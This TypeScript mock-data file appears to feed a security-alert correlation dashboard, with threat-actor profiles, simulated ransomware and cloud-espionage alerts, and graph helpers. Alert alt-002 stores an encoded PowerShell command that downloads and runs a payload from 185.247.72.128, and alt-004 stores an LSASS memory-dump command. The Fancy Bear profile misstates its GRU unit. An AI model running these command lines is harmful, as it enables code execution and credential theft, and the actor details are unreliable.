import { Severity, IOCType, SecurityAlert, AttackCampaign, ThreatActor, GraphNode, GraphEdge } from "./types";
import { correlateAlerts } from "../backend/correlation/correlation_service";
import { detectCampaign } from "../backend/correlation/campaign_engine";

export const mockThreatActors: ThreatActor[] = [
  {
    id: "FIN7",
    name: "FIN7",
    aliases: ["Gold Carbanak", "Carbon Spider", "ITTGroup"],
    origin: "Eastern Europe",
    targetSectors: ["Retail", "Restaurant/Hospitality", "Finance", "Healthcare"],
    observedTTPs: ["Phishing Attachments", "PowerShell Obfuscation", "Carbanak Malware", "Baiting", "Metasploit"],
    motivation: "Financial Gain / Enterprise Extortion",
    description: "FIN7 is a highly organized, financially-motivated Russian-speaking cybercriminal group that has targeted hospitality, retail, and financial entities since at least 2015. Known for sophisticated spearphishing campaigns mimicking commercial complaints or inquiries, and deploying advanced custom tools like Astra and Lizar loader."
  },
  {
    id: "Lazarus",
    name: "Lazarus Group",
    aliases: ["APT38", "Hidden Cobra", "Zinc", "Guardians of Peace"],
    origin: "North Korea",
    targetSectors: ["Cryptocurrency", "Defense Aerospace", "Global Banking", "Critical Infrastructure"],
    observedTTPs: ["Watering Hole Attacks", "MimiKatz credential theft", "Custom trojans", "Multi-stage loaders"],
    motivation: "State-sponsored Espionage & Revenue Generation",
    description: "Active since 2009, Lazarus is a state-backed actor responsible for massive ransomware outbreaks (WannaCry), attacks against crypto exchanges, espionage against aerospace companies, and heist attempts totaling billions in international reserves."
  },
  {
    id: "FancyBear",
    name: "Fancy Bear",
    aliases: ["APT28", "Sofacy", "Pawn Storm", "Strontium"],
    origin: "Russia",
    targetSectors: ["Government/Diplomatic", "Military", "Energy/Grid Utilities", "Think Tanks"],
    observedTTPs: ["Zero-day exploits", "Credential harvesting", "OAuth token abuse", "VPN infiltration"],
    motivation: "Geopolitical Espionage & Sabotage",
    description: "APT28 is a Russian military agency cyber division (GRUnit 74455), operating since at least 2004. Highly technical, specializing in fast compromise of embassy networks, deploying custom implants, and manipulating election/public discourse through leaks."
  },
  {
    id: "WizardSpider",
    name: "Wizard Spider",
    aliases: ["Gold Blackburn", "UNC1878"],
    origin: "Eurasia",
    targetSectors: ["Healthcare", "Manufacturing", "Education", "SaaS platforms"],
    observedTTPs: ["TrickBot Loader", "Ryuk/Conti Ransomware deployment", "AdFind discovery", "Cobalt Strike"],
    motivation: "Ransomware Extortion",
    description: "Highly lethal ransomware network responsible for Ryuk, Conti, and TrickBot development. Specializes in massive target attacks against critical utility sectors, demanding seven-figure ransoms and running double-extortion leak sites."
  }
];

// Reusable alert datasets depicting attack progression paths
export const mockAlerts: SecurityAlert[] = [
  // ShadowLock Campaign alerts
  {
    id: "alt-001",
    title: "Spearphishing Email Payload Delivered",
    sourceSystem: "Phishing Gateway",
    severity: Severity.MEDIUM,
    timestamp: "2026-06-08T08:12:00Z",
    description: "Email with subject 'Invoice #88391-Action Required' containing malicious macro-enabled Excel attachment delivered to c-suite assistant.",
    iocs: [
      { type: IOCType.EMAIL, value: "finance@billing-dept-portal.com" },
      { type: IOCType.HASH, value: "4a8e3f9a77cd5ac244a0e98f09faef4c" }
    ],
    affectedAsset: "WS-CHLOE-LAPTOP (Chloe - CEO Assistant)",
    user: "chloe.harrison@enterprise.com",
    actionTaken: "alerted",
    mitreTTPs: ["T1566.001 - Spearphishing Attachment", "T1204.002 - User Execution: Malicious File"]
  },
  {
    id: "alt-002",
    title: "Suspicious PowerShell Invocations from Excel Process",
    sourceSystem: "EDR",
    severity: Severity.HIGH,
    timestamp: "2026-06-08T08:14:15Z",
    description: "Excel spawning obfuscated PowerShell script with encoded command attempting to download external executable payload.",
    iocs: [
      { type: IOCType.PROCESS, value: "powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjI0Ny43Mi4xMjgvcGF5bG9hZCcp" },
      { type: IOCType.IP, value: "185.247.72.128" }
    ],
    affectedAsset: "WS-CHLOE-LAPTOP (Chloe - CEO Assistant)",
    user: "chloe.harrison@enterprise.com",
    actionTaken: "quarantined",
    mitreTTPs: ["T1059.001 - Command and Scripting Interpreter: PowerShell", "T1027 - Obfuscated Files or Information"]
  },
  {
    id: "alt-003",
    title: "DNS Query to Known Dynamic DNS Backdoor Domain",
    sourceSystem: "DNS Log",
    severity: Severity.HIGH,
    timestamp: "2026-06-08T08:15:30Z",
    description: "Endpoint lookup for domain 'security-update-service-microsoft.com' which resolves behind multi-homed threat infrastructure.",
    iocs: [
      { type: IOCType.DOMAIN, value: "security-update-service-microsoft.com" },
      { type: IOCType.IP, value: "185.247.72.128" }
    ],
    affectedAsset: "WS-CHLOE-LAPTOP (Chloe - CEO Assistant)",
    actionTaken: "none",
    mitreTTPs: ["T1071.001 - Application Layer Protocol: Web Protocols"]
  },
  {
    id: "alt-004",
    title: "Unusual LSASS Process Memory Dump Detected",
    sourceSystem: "EDR",
    severity: Severity.CRITICAL,
    timestamp: "2026-06-08T08:22:11Z",
    description: "Unauthorized application attempted to read and dumping memory of Local Security Authority Subsystem Service (LSASS) to harvest domain credentials.",
    iocs: [
      { type: IOCType.PROCESS, value: "rundll32.exe C:\\windows\\temp\\lsadmp.dll,Dump" },
      { type: IOCType.HASH, value: "c9ce6e902a7b88939e9fbfa7eb4db3bc" }
    ],
    affectedAsset: "WS-CHLOE-LAPTOP (Chloe - CEO Assistant)",
    user: "chloe.harrison@enterprise.com",
    actionTaken: "blocked",
    mitreTTPs: ["T1003.001 - OS Credential Dumping: Lsass Memory"]
  },
  {
    id: "alt-005",
    title: "Sudden Lateral Movement SMB Scanning Activities",
    sourceSystem: "SIEM",
    severity: Severity.HIGH,
    timestamp: "2026-06-08T08:29:40Z",
    description: "Chloe's laptop initiated massive port 445 (SMB) connection scanning requests across local HR and Production VLAN subnets in less than 30 seconds.",
    iocs: [
      { type: IOCType.IP, value: "10.0.4.15" }, // Laptop IP
      { type: IOCType.HOST, value: "HR-DB-SERVER-01" },
      { type: IOCType.HOST, value: "PROD-LOGISTICS-VM" }
    ],
    affectedAsset: "Internal Subnet 10.0.4.0/24",
    actionTaken: "alerted",
    mitreTTPs: ["T1046 - Network Service Discovery", "T1021.002 - Remote Services: SMB/Windows Admin Shares"]
  },
  {
    id: "alt-006",
    title: "Successful Remote PowerShell Session Established",
    sourceSystem: "Active Directory",
    severity: Severity.CRITICAL,
    timestamp: "2026-06-08T08:31:00Z",
    description: "Domain Admin credentials derived from chloe-laptop utilized to open a remote session onto production database VM from unauthorized subnet.",
    iocs: [
      { type: IOCType.USER, value: "admin.backup" },
      { type: IOCType.IP, value: "10.0.4.15" }
    ],
    affectedAsset: "PROD-LOGISTICS-VM (Logistics Database)",
    actionTaken: "alerted",
    mitreTTPs: ["T1021.006 - Remote Services: Windows Remote Management", "T1078.002 - Valid Accounts: Domain Accounts"]
  },
  {
    id: "alt-007",
    title: "Mass file rename event detected: ryuk/conti extension",
    sourceSystem: "EDR",
    severity: Severity.CRITICAL,
    timestamp: "2026-06-08T08:35:45Z",
    description: "Prod logistics database spawning multi-threaded file manipulation thread appended with encrypted file indices and dropping ransom note CONTI_README.txt.",
    iocs: [
      { type: IOCType.PROCESS, value: "srvhost_enc.exe" },
      { type: IOCType.HASH, value: "ffac3e4d693a8cf8becb71e19488a03c" }
    ],
    affectedAsset: "PROD-LOGISTICS-VM (Logistics Database)",
    actionTaken: "blocked",
    mitreTTPs: ["T1486 - Data Encrypted for Impact"]
  },

  // ArcticRift Campaign alerts (Cloud Espionage)
  {
    id: "alt-101",
    title: "Abnormal TLS Connection to Suspicious Subnet",
    sourceSystem: "Firewall",
    severity: Severity.MEDIUM,
    timestamp: "2026-06-08T05:00:10Z",
    description: "Cloud egress log identifies long-lived outbound SSL socket from core cloud application to unknown IP belonging to hosting provider in foreign region.",
    iocs: [
      { type: IOCType.IP, value: "203.0.113.88" },
      { type: IOCType.DOMAIN, value: "secure-dns-route.net" }
    ],
    affectedAsset: "Cloud-SaaS-Svc (AWS EC2 Instance)",
    actionTaken: "alerted",
    mitreTTPs: ["T1071.001 - Web Protocols"]
  },
  {
    id: "alt-102",
    title: "AWS Privilege Escalation Via IAM AssumeRole",
    sourceSystem: "CloudTrail",
    severity: Severity.HIGH,
    timestamp: "2026-06-08T05:05:22Z",
    description: "The AWS instance profile compromised from TLS hack assumed critical administrator IAM policy context from an unrecognized external endpoint IP.",
    iocs: [
      { type: IOCType.USER, value: "IAM-Dev-Role-Assumed" },
      { type: IOCType.IP, value: "203.0.113.88" }
    ],
    affectedAsset: "prod-cloud-accounts-env",
    actionTaken: "alerted",
    mitreTTPs: ["T1134 - Access Token Manipulation", "T1078.004 - Cloud Accounts"]
  },
  {
    id: "alt-103",
    title: "S3 Bucket Synchronization and Massive Download",
    sourceSystem: "CloudTrail",
    severity: Severity.CRITICAL,
    timestamp: "2026-06-08T05:12:00Z",
    description: "Bulk data dump in progress. S3 bucket containing client proprietary blueprint CAD schemas was systematically packed, zipped and exfiltrated to the compromised server.",
    iocs: [
      { type: IOCType.IP, value: "203.0.113.88" },
      { type: IOCType.URL, value: "https://secure-dns-route.net/upload/sys-data.bin" }
    ],
    affectedAsset: "AWS-S3-BLUEPRINTS-VAULT",
    actionTaken: "none",
    mitreTTPs: ["T1119 - Automated Information Acquisition", "T1048.003 - Exfiltration Over Alternative Protocol"]
  }
];

// Dynamically partition and correlate campaigns
const shadowLockAlerts = mockAlerts.filter(a => {
  const text = (a.title + " " + a.description).toLowerCase();
  return text.includes("phishing") || text.includes("powershell") || text.includes("lsass") || text.includes("lateral") || text.includes("smb") || text.includes("winrm") || text.includes("rename") || text.includes("ryuk") || text.includes("conti");
});

const arcticRiftAlerts = mockAlerts.filter(a => {
  const text = (a.title + " " + a.description).toLowerCase();
  return text.includes("cloud") || text.includes("aws") || text.includes("s3") || text.includes("iam") || text.includes("assumerole") || text.includes("tls connection") || a.sourceSystem === "CloudTrail";
});

const shadowLockCorrelation = correlateAlerts(shadowLockAlerts);
const arcticRiftCorrelation = correlateAlerts(arcticRiftAlerts);

const countUniqueIocs = (alerts: SecurityAlert[]) => {
  const iocValues = alerts.flatMap(a => a.iocs.map(ioc => ioc.value));
  return new Set(iocValues).size;
};

const extractTTPsList = (alerts: SecurityAlert[]) => {
  const ttps = alerts.flatMap(a => a.mitreTTPs || []).map(t => t.split(" ")[0]);
  return Array.from(new Set(ttps));
};

export const mockCampaigns: AttackCampaign[] = [
  {
    id: "camp-001",
    name: `${shadowLockCorrelation.campaignName} Ransomware Deployment`,
    threatActor: "Wizard Spider",
    confidence: shadowLockCorrelation.confidence,
    riskScore: shadowLockCorrelation.score,
    status: "active",
    initialAccess: "Spearphishing Attachment",
    persistence: "PowerShell Backdoor Downloaded",
    lateralMovement: "Remote PowerShell (WinRM)",
    targetSector: "Logistics and Supply Chain",
    summary: "A ransomware deployment campaign targetting core logistics databases. It starts from a macro spearphishing email delivered to the CEO's executive assistant, expanding via OS credential harvesting from memory dumps, and moves laterally using SMB to compromise administrative servers to execute the Conti/Ryuk encrypter.",
    aiExplanation: `Our correlation engine linked these ${shadowLockAlerts.length} disparate events into ShadowLock because:\n1. Chronological sequencing demonstrates: ${shadowLockCorrelation.timeline.join(" -> ")}.\n2. Detected attack pattern signature is evaluated as: ${shadowLockCorrelation.attackType}.\n3. Target entities compromised: ${Array.from(new Set(shadowLockAlerts.map(a => a.affectedAsset))).join(", ")}.`,
    recommendedActions: [
      "Quarantine host WS-CHLOE-LAPTOP immediately and isolate the backup domain administrator credential.",
      "Block traffic to foreign IP address 185.247.72.128 and blackhole domain security-update-service-microsoft.com in the DNS controller.",
      "Shut down WinRM remote access temporarily on critical production databases and rotate database administrator passwords.",
      "Kill process srvhost_enc.exe and deploy volume recovery options for PROD-LOGISTICS-VM."
    ],
    alertsCount: shadowLockAlerts.length,
    iocsCount: countUniqueIocs(shadowLockAlerts),
    createdAt: shadowLockAlerts[0]?.timestamp || "2026-06-08T08:12:00Z",
    ttps: extractTTPsList(shadowLockAlerts)
  },
  {
    id: "camp-002",
    name: `${arcticRiftCorrelation.campaignName} Cyber Espionage`,
    threatActor: "Fancy Bear",
    confidence: arcticRiftCorrelation.confidence,
    riskScore: arcticRiftCorrelation.score,
    status: "monitoring",
    initialAccess: "Compromised cloud egress application",
    persistence: "Stolen Cloud Access Keys",
    lateralMovement: "IAM Cross-Account Role Assumption",
    targetSector: "Defense Technology Blueprints",
    summary: "State-sponsored cyber threat aiming to steal blueprints using compromised cloud app egress channels, privilege climbing to acquire high-privilege AWS credentials, and bulk exfiltrating encrypted data packages to a rogue hosting node.",
    aiExplanation: `Linked to Operation ArcticRift because:\n1. Overlapping cloud environment markers and target host patterns in the timeline: ${arcticRiftCorrelation.timeline.join(" -> ")}.\n2. Potential exfiltration vector matching threat actor targets for sector: Defense Technology Blueprints.`,
    recommendedActions: [
      "Revoke IAM-Dev-Role-Assumed credentials and implement strict MFA on AWS Role requests.",
      "Apply CloudTrail automatic quarantine policies to isolate bucket vaults from unauthorized connections.",
      "Deploy Web Application Firewall rules to block payloads containing secure-dns-route.net urls."
    ],
    alertsCount: arcticRiftAlerts.length,
    iocsCount: countUniqueIocs(arcticRiftAlerts),
    createdAt: arcticRiftAlerts[0]?.timestamp || "2026-06-08T05:00:10Z",
    ttps: extractTTPsList(arcticRiftAlerts)
  }
];


// Helper to convert alerts to relationship nodes & links
export function generateGraphData(alerts: SecurityAlert[]): { nodes: GraphNode[]; links: GraphEdge[] } {
  const nodesMap = new Map<string, GraphNode>();
  const links: GraphEdge[] = [];

  // Always seed alert node coordinates and core structures
  alerts.forEach((alert) => {
    // Alert node
    nodesMap.set(alert.id, {
      id: alert.id,
      label: alert.sourceSystem,
      type: "alert",
      severity: alert.severity,
      details: `${alert.title}: ${alert.description}`
    });

    // Asset node
    if (alert.affectedAsset) {
      const assetId = `asset-${alert.affectedAsset.replace(/\s+/g, "-").toLowerCase()}`;
      if (!nodesMap.has(assetId)) {
        nodesMap.set(assetId, {
          id: assetId,
          label: alert.affectedAsset.split(" ")[0],
          type: "host",
          details: `Target Resource: ${alert.affectedAsset}`
        });
      }
      links.push({
        id: `link-${alert.id}-${assetId}`,
        source: alert.id,
        target: assetId,
        label: "targeted"
      });
    }

    // Process user node
    if (alert.user) {
      const userId = `user-${alert.user.replace(/\s+/g, "-").toLowerCase()}`;
      if (!nodesMap.has(userId)) {
        nodesMap.set(userId, {
          id: userId,
          label: alert.user.split("@")[0],
          type: "user",
          details: `User Context: ${alert.user}`
        });
      }
      links.push({
        id: `link-${userId}-${alert.id}`,
        source: userId,
        target: alert.id,
        label: "triggered"
      });
    }

    // IOC nodes
    alert.iocs.forEach((ioc, idx) => {
      const iocNodeId = `ioc-${ioc.type.toLowerCase()}-${ioc.value.replace(/\s+/g, "-").toLowerCase()}`;
      let nType: "ip" | "domain" | "hash" | "email" | "file" | "process" = "ip";
      if (ioc.type === IOCType.DOMAIN) nType = "domain";
      if (ioc.type === IOCType.HASH) nType = "hash";
      if (ioc.type === IOCType.EMAIL) nType = "email";
      if (ioc.type === IOCType.PROCESS) nType = "process";

      if (!nodesMap.has(iocNodeId)) {
        nodesMap.set(iocNodeId, {
          id: iocNodeId,
          label: ioc.value.length > 20 ? `${ioc.value.substring(0, 17)}...` : ioc.value,
          type: nType,
          details: `Indicator: [${ioc.type}] ${ioc.value}`
        });
      }

      links.push({
        id: `link-${alert.id}-${iocNodeId}-${idx}`,
        source: alert.id,
        target: iocNodeId,
        label: "exhibits"
      });
    });
  });

  return {
    nodes: Array.from(nodesMap.values()),
    links
  };
}

// Simulated network streams
export const simulatedStreamLogs = [
  {
    timestamp: "2026-06-08T13:40:02Z",
    sourceSystem: "Firewall",
    severity: "LOW",
    title: "Port scan activity from internal server",
    description: "Inbound SSH brute force attempts observed over range 10.0.12.1 to 10.0.12.15.",
    iocs: "src_ip=192.168.10.45, dest_port=22"
  },
  {
    timestamp: "2026-06-08T13:41:15Z",
    sourceSystem: "Phishing Gateway",
    severity: "MEDIUM",
    title: "Suspicious PDF attachment bypassed filter",
    description: "Email subject 'Quarterly Logistics Audit' containing dynamic javascript attachment delivered to logistics-team.",
    iocs: "sender=auditing-group-secures@post-office-relay.net, md5=e3b0c44298fc1c149afbf4c8996fb924"
  },
  {
    timestamp: "2026-06-08T13:42:30Z",
    sourceSystem: "SIEM",
    severity: "HIGH",
    title: "AD Account Locked under Brute-Force",
    description: "Account logistics-supervisor triggered 45 failed domain logon attempts in 2 seconds.",
    iocs: "user=logistics-supervisor, ip=10.0.4.52"
  },
  {
    timestamp: "2026-06-08T13:43:08Z",
    sourceSystem: "EDR",
    severity: "HIGH",
    title: "CMD process running unsigned binaries",
    description: "Command prompt spawned dynamic binary process 'svchost-update.exe' loaded from temporary network drives.",
    iocs: "hash=ff3aee89cc9811eaacba780001f3dbdf, path=C:\\Users\\chloe\\AppData\\Local\\Temp\\"
  },
  {
    timestamp: "2026-06-08T13:44:00Z",
    sourceSystem: "DNS Log",
    severity: "CRITICAL",
    title: "Active C2 Beacon Connection Found",
    description: "Unusual DNS queries communicating with newly registered domain billing-dept-portal.com.",
    iocs: "domain=billing-dept-portal.com, ip=185.247.72.128"
  }
];
